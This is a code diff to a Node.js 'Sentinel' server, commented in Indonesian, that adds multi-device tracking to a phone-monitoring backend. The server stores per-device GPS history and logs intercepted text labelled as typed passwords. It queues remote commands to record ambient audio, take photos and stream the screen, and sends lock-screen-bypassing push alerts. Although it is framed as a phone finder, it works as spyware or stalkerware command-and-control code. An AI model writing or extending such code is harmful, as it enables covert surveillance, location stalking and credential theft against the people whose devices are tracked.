@@ -51,7 +51,10 @@ let sentinelState = {
   latest: null,
   history: [],
   alerts: [],
-  intercepts: []
+  intercepts: [],
+  devices: {},
+  activeDeviceId: null,
+  barkKey: ''
 };
 
 let latestScreenFrame = null;
@@ -63,6 +66,8 @@ try {
     if (!Array.isArray(sentinelState.history)) sentinelState.history = [];
     if (!Array.isArray(sentinelState.alerts)) sentinelState.alerts = [];
     if (!Array.isArray(sentinelState.intercepts)) sentinelState.intercepts = [];
+    if (!sentinelState.devices || typeof sentinelState.devices !== 'object') sentinelState.devices = {};
+    if (typeof sentinelState.barkKey !== 'string') sentinelState.barkKey = '';
   }
 } catch (e) {
   console.error('[Sentinel] Gagal membaca data tersimpan:', e.message);
@@ -502,15 +507,22 @@ const pendingRadarCommands = [];
 function addRadarCommand(cmd) {
   pendingRadarCommands.push({
     ...cmd,
+    targetDeviceId: cmd.targetDeviceId || 'all',
     id: Date.now() + '_' + Math.random().toString(36).substring(2, 6),
     timestamp: Date.now()
   });
   if (pendingRadarCommands.length > 50) pendingRadarCommands.shift();
 }
 
-function getActiveRadarCommands() {
+function getActiveRadarCommands(deviceId = null) {
   const now = Date.now();
-  return pendingRadarCommands.filter(c => now - c.timestamp < 35000);
+  return pendingRadarCommands.filter(c => {
+    if (now - c.timestamp >= 35000) return false;
+    if (!deviceId || !c.targetDeviceId || c.targetDeviceId === 'all' || c.targetDeviceId === deviceId) {
+      return true;
+    }
+    return false;
+  });
 }
 
 function broadcast(eventData) {
@@ -930,16 +942,43 @@ const server = http.createServer(async (req, res) => {
     return;
   }
 
-  // Telemetri Status Terkini & Riwayat
+  // Telemetri Status Terkini & Riwayat (Mendukung Multi-Perangkat Terpisah)
   if (pathname === '/api/sentinel/status' && req.method === 'GET') {
     const ip = getLocalIp();
     const pairingPin = sentinelState.pairingPin || '7890';
+    const reqDevId = parsedUrl.searchParams.get('deviceId');
+
+    let currentEntry = sentinelState.latest;
+    let historyList = sentinelState.history;
+
+    if (reqDevId && sentinelState.devices && sentinelState.devices[reqDevId]) {
+      const dev = sentinelState.devices[reqDevId];
+      currentEntry = dev.latest || currentEntry;
+      historyList = dev.history && dev.history.length > 0 ? dev.history : historyList;
+    }
+
+    const deviceList = Object.values(sentinelState.devices || {}).map(d => ({
+      id: d.id,
+      name: d.name || d.id,
+      platform: d.platform || 'Smartphone',
+      lastSeen: d.lastSeen,
+      lat: d.latest ? d.latest.lat : null,
+      lon: d.latest ? d.latest.lon : null,
+      accuracy: d.latest ? d.latest.accuracy : null,
+      batteryLevel: d.latest ? d.latest.batteryLevel : null,
+      isCharging: d.latest ? d.latest.isCharging : false,
+      photo: d.latest ? d.latest.photo : null,
+      speed: d.latest ? d.latest.speed : 0
+    })).sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
+
     res.writeHead(200, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({
       ok: true,
-      current: sentinelState.latest,
+      current: currentEntry,
+      devices: deviceList,
+      activeDeviceId: reqDevId || sentinelState.activeDeviceId || (deviceList[0] ? deviceList[0].id : null),
       alerts: sentinelState.alerts,
-      history: sentinelState.history.slice(0, 30),
+      history: historyList.slice(0, 40),
       intercepts: sentinelState.intercepts.slice(0, 50),
       cloudUrl: publicTunnelUrl,
       beaconUrl: publicTunnelUrl ? `${publicTunnelUrl}/api/sentinel/beacon` : `http://${ip}:${PORT}/api/sentinel/beacon`,
@@ -949,8 +988,48 @@ const server = http.createServer(async (req, res) => {
       pairingPin,
       localIp: ip,
       hasActiveScreenStream: Boolean(latestScreenFrame && (Date.now() - latestScreenFrame.timestamp < 10000)),
-      storage: getStorageSummary()
+      storage: getStorageSummary(),
+      barkKey: sentinelState.barkKey || ''
     }));
+    return;
+  }
+
+  // Simpan Pengaturan Sentinel (seperti Bark Key untuk Push Kritis HP Terkunci)
+  if (pathname === '/api/sentinel/save_settings' && req.method === 'POST') {
+    let body = '';
+    req.on('data', chunk => { body += chunk; });
+    req.on('end', () => {
+      try {
+        const data = JSON.parse(body || '{}');
+        if (typeof data.barkKey === 'string') {
+          sentinelState.barkKey = data.barkKey.trim();
+        }
+        saveSentinelData();
+        console.log('[Sentinel] ⚙️ Pengaturan Sentinel Disimpan. Bark Key:', sentinelState.barkKey ? 'Tersedia' : 'Kosong');
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ ok: true, barkKey: sentinelState.barkKey }));
+      } catch (e) {
+        res.writeHead(400, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ ok: false, error: e.message }));
+      }
+    });
+    return;
+  }
+
+  // Reset & Bersihkan Riwayat Data Campur Aduk
+  if (pathname === '/api/sentinel/reset_data' && req.method === 'POST') {
+    sentinelState.history = [];
+    sentinelState.alerts = [];
+    sentinelState.intercepts = [];
+    sentinelState.devices = {};
+    sentinelState.latest = null;
+    sentinelState.activeDeviceId = null;
+    saveSentinelData();
+    broadcast({ type: 'sentinel_reset', timestamp: Date.now() });
+    console.log('[Sentinel] 🧹 Riwayat data pelacakan & perangkat campur aduk berhasil dibersihkan total!');
+    sendToHelper('TEXT [SENTINEL] 🧹 RIWAYAT PELACAKAN DIBERSIHKAN');
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ ok: true, message: 'Seluruh riwayat uji coba campur aduk berhasil dibersihkan' }));
     return;
   }
 
@@ -1829,46 +1908,66 @@ const server = http.createServer(async (req, res) => {
     req.on('end', () => {
       let mode = 'sonar';
       let duration = 5;
+      let targetDeviceId = 'all';
       try {
         if (body) {
           const parsed = JSON.parse(body);
           if (parsed.mode) mode = parsed.mode;
           if (parsed.duration) duration = parsed.duration;
+          if (parsed.targetDeviceId) targetDeviceId = parsed.targetDeviceId;
         }
       } catch (e) {}
 
       if (mode === 'stop') {
-        broadcast({ type: 'stop_chime', timestamp: Date.now() });
-        addRadarCommand({ type: 'stop', mode: 'stop' });
-        console.log('[Sentinel] ⏹️ Sinyal Hentikan Bunyi Dikirim ke Perangkat');
+        broadcast({ type: 'stop_chime', targetDeviceId, timestamp: Date.now() });
+        addRadarCommand({ type: 'stop', mode: 'stop', targetDeviceId });
+        console.log(`[Sentinel] ⏹️ Sinyal Hentikan Bunyi Dikirim ke Target (${targetDeviceId})`);
         sendToHelper('TEXT [SENTINEL] ⏹️ BUNYI DIHENTIKAN');
       } else if (mode === 'record_audio') {
-        broadcast({ type: 'record_audio', duration, timestamp: Date.now() });
-        addRadarCommand({ type: 'record_audio', duration });
-        console.log('[Sentinel] 🎙️ Perintah Rekam Suara Sekitar Dikirim ke Perangkat');
+        broadcast({ type: 'record_audio', duration, targetDeviceId, timestamp: Date.now() });
+        addRadarCommand({ type: 'record_audio', duration, targetDeviceId });
+        console.log(`[Sentinel] 🎙️ Perintah Rekam Suara Sekitar Dikirim ke Target (${targetDeviceId})`);
         sendToHelper('TEXT [SENTINEL] 🎙️ MEREKAM SUARA SEKITAR (5s)...');
       } else if (mode === 'photo' || mode === 'selfie') {
-        broadcast({ type: 'capture_photo', mode, timestamp: Date.now() });
-        addRadarCommand({ type: 'photo', mode });
-        console.log('[Sentinel] 📸 Perintah Jepret Kamera Dikirim ke Perangkat');
+        broadcast({ type: 'capture_photo', mode, targetDeviceId, timestamp: Date.now() });
+        addRadarCommand({ type: 'photo', mode, targetDeviceId });
+        console.log(`[Sentinel] 📸 Perintah Jepret Kamera Dikirim ke Target (${targetDeviceId})`);
         sendToHelper('TEXT [SENTINEL] 📸 JEPRET KAMERA HP...');
       } else {
-        broadcast({ type: 'play_chime', mode, timestamp: Date.now() });
-        addRadarCommand({ type: mode, mode });
-        console.log(`[Sentinel] 🔔 Sinyal Dering/Radar (${mode.toUpperCase()}) Dikirim ke Target`);
+        broadcast({ type: 'play_chime', mode, targetDeviceId, timestamp: Date.now() });
+        addRadarCommand({ type: mode, mode, targetDeviceId });
+        console.log(`[Sentinel] 🔔 Sinyal Dering/Radar (${mode.toUpperCase()}) Dikirim ke Target (${targetDeviceId})`);
         sendToHelper(`TEXT [SENTINEL] 🔔 RADAR PENCARI: ${mode.toUpperCase()} DIPICU!`);
       }
 
+      // Jika Bark Key terpasang, kirim juga Apple Critical Alert Push ke iPhone (Bypass Lockscreen & Silent Switch)
+      if (sentinelState.barkKey && (mode === 'sonar' || mode === 'siren' || mode === 'chime' || mode === 'alarm')) {
+        try {
+          const isSiren = (mode === 'siren' || mode === 'alarm');
+          const title = encodeURIComponent(isSiren ? '🚨 SIRINE DARURAT SENTINEL' : '🔊 RADAR PENCARI HP (RUMAH)');
+          const bodyText = encodeURIComponent('HP Anda sedang dicari di rumah! Bunyi sirine aktif menembus layar kunci.');
+          const barkUrl = `https://api.day.app/${encodeURIComponent(sentinelState.barkKey)}/${title}/${bodyText}?sound=alarm&level=critical&volume=10&badge=1`;
+          fetch(barkUrl, { signal: AbortSignal.timeout(5000) }).then(r => {
+            console.log(`[Sentinel Bark Push] 🚀 Critical Alert Push terkirim ke Bark iPhone (Status: ${r.status})`);
+          }).catch(err => {
+            console.warn('[Sentinel Bark Push Error]', err.message);
+          });
+        } catch (err) {
+          console.warn('[Sentinel Bark Push Exception]', err.message);
+        }
+      }
+
       res.writeHead(200, { 'Content-Type': 'application/json' });
-      res.end(JSON.stringify({ ok: true, mode, message: `Radar command ${mode} broadcasted` }));
+      res.end(JSON.stringify({ ok: true, mode, targetDeviceId, message: `Radar command ${mode} broadcasted` }));
     });
     return;
   }
 
   // Polling Antrean Perintah Radar untuk iPhone
   if ((pathname === '/api/sentinel/commands' || pathname.startsWith('/api/cmd')) && (req.method === 'GET' || req.method === 'POST')) {
+    const devId = parsedUrl.searchParams.get('deviceId') || parsedUrl.searchParams.get('id');
     res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(JSON.stringify({ ok: true, commands: getActiveRadarCommands() }));
+    res.end(JSON.stringify({ ok: true, commands: getActiveRadarCommands(devId) }));
     return;
   }
 
@@ -2038,6 +2137,10 @@ const server = http.createServer(async (req, res) => {
         const rtt = payload.rtt !== undefined ? payload.rtt : null;
         const platform = payload.platform || (userAgent.includes('iPhone') ? 'Apple iPhone (iOS)' : (userAgent.includes('Android') ? 'Android Mobile' : 'Perangkat Web'));
 
+        const deviceId = String(payload.deviceId || payload.device || payload.id || 'IPHONE-RADAR').trim();
+        const defaultName = platform.includes('iPhone') ? 'Apple iPhone' : (platform.includes('Android') ? 'Android Mobile' : 'Smartphone');
+        const deviceName = payload.deviceName || payload.name || `${defaultName} (${deviceId.slice(-4)})`;
+
         // Forensic ISP / Carrier Lookup
         const ipForensics = await getIpForensics(clientIp);
         const finalNetworkName = (payload.networkName && payload.networkName !== 'Online' && payload.networkName !== 'Seluler')
@@ -2047,13 +2150,15 @@ const server = http.createServer(async (req, res) => {
           ? payload.networkType
           : (ipForensics && ipForensics.as ? ipForensics.as : 'Jaringan Publik');
 
-        // Kalkulasi Geodesi Nyata untuk Aktivitas & Kecepatan
+        // Kalkulasi Geodesi Nyata untuk Aktivitas & Kecepatan (KHUSUS PERANGKAT INI, TIDAK TERCAMPUR DENGAN HP LAIN)
         let calculatedActivity = '🛑 Diam / Stasioner (Radius GPS < 5m)';
         let calculatedSpeed = 0;
 
-        if (sentinelState.latest && sentinelState.latest.lat && sentinelState.latest.lon && lat !== 0 && lon !== 0) {
-          const dist = calculateHaversineDistance(sentinelState.latest.lat, sentinelState.latest.lon, lat, lon);
-          const timeDeltaSec = Math.max(1, (now - sentinelState.latest.timestamp) / 1000);
+        const prevDeviceEntry = sentinelState.devices && sentinelState.devices[deviceId] ? sentinelState.devices[deviceId].latest : null;
+
+        if (prevDeviceEntry && prevDeviceEntry.lat && prevDeviceEntry.lon && lat !== 0 && lon !== 0) {
+          const dist = calculateHaversineDistance(prevDeviceEntry.lat, prevDeviceEntry.lon, lat, lon);
+          const timeDeltaSec = Math.max(1, (now - prevDeviceEntry.timestamp) / 1000);
           if (timeDeltaSec < 3600) {
             const speedKmh = Math.round((dist / timeDeltaSec) * 3.6);
             if (dist >= 15 && speedKmh >= 3) {
@@ -2074,8 +2179,10 @@ const server = http.createServer(async (req, res) => {
 
         const beaconEntry = {
           id: now + '_' + Math.random().toString(36).substring(2, 6),
-          lat: (lat !== 0) ? lat : (sentinelState.latest ? sentinelState.latest.lat : -6.2088),
-          lon: (lon !== 0) ? lon : (sentinelState.latest ? sentinelState.latest.lon : 106.8456),
+          deviceId,
+          deviceName,
+          lat: (lat !== 0) ? lat : (prevDeviceEntry ? prevDeviceEntry.lat : (sentinelState.latest ? sentinelState.latest.lat : -6.2088)),
+          lon: (lon !== 0) ? lon : (prevDeviceEntry ? prevDeviceEntry.lon : (sentinelState.latest ? sentinelState.latest.lon : 106.8456)),
           accuracy,
           altitude: payload.altitude !== undefined && payload.altitude !== null ? parseFloat(payload.altitude) : null,
           altitudeAccuracy: payload.altitudeAccuracy ? parseFloat(payload.altitudeAccuracy) : null,
@@ -2111,21 +2218,49 @@ const server = http.createServer(async (req, res) => {
           passiveStats: payload.passiveStats || null,
           phone: payload.phone || null,
           name: payload.name || null,
-          photo: photoUrl || (sentinelState.latest ? sentinelState.latest.photo : null),
-          photoSha256: photoHash || (sentinelState.latest ? sentinelState.latest.photoSha256 : null),
-          environmentPhoto: envPhotoUrl || (sentinelState.latest ? sentinelState.latest.environmentPhoto : null),
-          environmentPhotoSha256: envPhotoHash || (sentinelState.latest ? sentinelState.latest.environmentPhotoSha256 : null),
+          photo: photoUrl || (prevDeviceEntry ? prevDeviceEntry.photo : (sentinelState.latest ? sentinelState.latest.photo : null)),
+          photoSha256: photoHash || (prevDeviceEntry ? prevDeviceEntry.photoSha256 : null),
+          environmentPhoto: envPhotoUrl || (prevDeviceEntry ? prevDeviceEntry.environmentPhoto : (sentinelState.latest ? sentinelState.latest.environmentPhoto : null)),
+          environmentPhotoSha256: envPhotoHash || (prevDeviceEntry ? prevDeviceEntry.environmentPhotoSha256 : null),
           address: payload.address || null,
           timestamp: now
         };
 
+        // Simpan ke Manajemen Multi-Perangkat Terpisah
+        if (!sentinelState.devices) sentinelState.devices = {};
+        if (!sentinelState.devices[deviceId]) {
+          sentinelState.devices[deviceId] = {
+            id: deviceId,
+            name: deviceName,
+            platform,
+            firstSeen: now,
+            lastSeen: now,
+            latest: null,
+            history: []
+          };
+        }
+        sentinelState.devices[deviceId].name = deviceName;
+        sentinelState.devices[deviceId].platform = platform;
+        sentinelState.devices[deviceId].lastSeen = now;
+        sentinelState.devices[deviceId].latest = beaconEntry;
+        if (!Array.isArray(sentinelState.devices[deviceId].history)) {
+          sentinelState.devices[deviceId].history = [];
+        }
+        sentinelState.devices[deviceId].history.unshift(beaconEntry);
+        if (sentinelState.devices[deviceId].history.length > 50) {
+          sentinelState.devices[deviceId].history.pop();
+        }
+
         sentinelState.latest = beaconEntry;
+        sentinelState.activeDeviceId = deviceId;
         sentinelState.history.unshift(beaconEntry);
         if (sentinelState.history.length > 100) sentinelState.history.pop();
 
         if (alertType && alertType !== 'normal') {
           sentinelState.alerts.unshift({
             id: beaconEntry.id,
+            deviceId,
+            deviceName,
             alertType,
             timestamp: now,
             lat: beaconEntry.lat,
@@ -2135,12 +2270,14 @@ const server = http.createServer(async (req, res) => {
           if (sentinelState.alerts.length > 50) sentinelState.alerts.pop();
 
           // Kirim OSD teks peringatan ke layar laptop
-          sendToHelper(`TEXT [SENTINEL] PERINGATAN: JEBAKAN ${alertType.toUpperCase()} TERPICU!`);
+          sendToHelper(`TEXT [SENTINEL] PERINGATAN (${deviceName}): JEBAKAN ${alertType.toUpperCase()} TERPICU!`);
         }
 
         if (payload.text || payload.interceptedText || payload.input || payload.value) {
           addIntercept({
             type: payload.type || 'input',
+            deviceId,
+            deviceName,
             label: payload.label || '⌨️ Data / Sandi Diketik',
             value: payload.text || payload.interceptedText || payload.input || payload.value,
             lat: beaconEntry.lat,
@@ -2150,17 +2287,39 @@ const server = http.createServer(async (req, res) => {
         }
 
         saveSentinelData();
-        broadcast({ type: 'sentinel_beacon', current: beaconEntry, alerts: sentinelState.alerts });
 
-        console.log(`[Sentinel] 📍 BEACON: [${beaconEntry.lat.toFixed(5)}, ${beaconEntry.lon.toFixed(5)}] | Pemicu: ${alertType} | ISP: ${beaconEntry.networkName} | Bat: ${beaconEntry.batteryNote}`);
+        const deviceList = Object.values(sentinelState.devices).map(d => ({
+          id: d.id,
+          name: d.name,
+          platform: d.platform,
+          lastSeen: d.lastSeen,
+          lat: d.latest ? d.latest.lat : null,
+          lon: d.latest ? d.latest.lon : null,
+          accuracy: d.latest ? d.latest.accuracy : null,
+          batteryLevel: d.latest ? d.latest.batteryLevel : null,
+          isCharging: d.latest ? d.latest.isCharging : false,
+          photo: d.latest ? d.latest.photo : null
+        }));
+
+        broadcast({
+          type: 'sentinel_beacon',
+          current: beaconEntry,
+          deviceId,
+          deviceName,
+          devices: deviceList,
+          alerts: sentinelState.alerts
+        });
+
+        console.log(`[Sentinel] 📍 BEACON [${deviceId} - ${deviceName}]: [${beaconEntry.lat.toFixed(5)}, ${beaconEntry.lon.toFixed(5)}] | Pemicu: ${alertType} | ISP: ${beaconEntry.networkName} | Bat: ${beaconEntry.batteryNote}`);
 
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({
           ok: true,
           message: 'Beacon telemetry berhasil diterima & diamankan',
           id: beaconEntry.id,
+          deviceId,
           timestamp: now,
-          commands: getActiveRadarCommands()
+          commands: getActiveRadarCommands(deviceId)
         }));
       } catch (err) {
         console.error('[Sentinel Beacon Error]', err);
